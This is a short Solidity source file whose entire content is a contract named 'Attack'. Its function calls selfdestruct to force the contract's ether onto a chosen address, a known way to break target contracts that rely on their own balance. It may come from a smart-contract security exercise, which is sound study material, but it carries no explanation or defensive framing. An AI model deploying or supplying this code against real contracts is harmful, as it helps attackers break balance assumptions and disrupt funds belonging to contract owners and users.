pragma solidity ^0.6.10;

contract Attack {
    function attack(address payable _addr) public payable {
        selfdestruct(_addr);
    }
}
